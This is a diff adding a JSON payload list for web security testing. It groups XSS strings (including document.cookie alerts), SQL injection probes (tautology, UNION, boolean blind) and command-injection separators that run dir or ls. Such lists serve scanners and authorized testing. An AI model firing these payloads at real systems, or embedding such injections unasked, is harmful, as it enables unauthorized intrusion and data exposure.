@@ -1,0 +1,43 @@
+{
+    "xss": {
+        "reflected": [
+            "<script>alert(1)</script>",
+            "<img src=x onerror=alert(1)>",
+            "<svg/onload=alert(1)>"
+        ],
+        "stored": [
+            "<script>alert(document.cookie)</script>",
+            "<img src=x onerror=alert(document.cookie)>"
+        ],
+        "dom": [
+            "javascript:alert(1)",
+            "data:text/html,<script>alert(1)</script>"
+        ]
+    },
+    "sqli": {
+        "error": [
+            "' OR '1'='1",
+            "' OR 1=1--"
+        ],
+        "union": [
+            "' UNION SELECT NULL--",
+            "' UNION SELECT NULL,NULL--"
+        ],
+        "blind": [
+            "' AND 1=1--",
+            "' AND 1=2--"
+        ]
+    },
+    "cmd": {
+        "windows": [
+            "& dir",
+            "; dir",
+            "| dir"
+        ],
+        "linux": [
+            "; ls",
+            "& ls",
+            "| ls"
+        ]
+    }
+} 
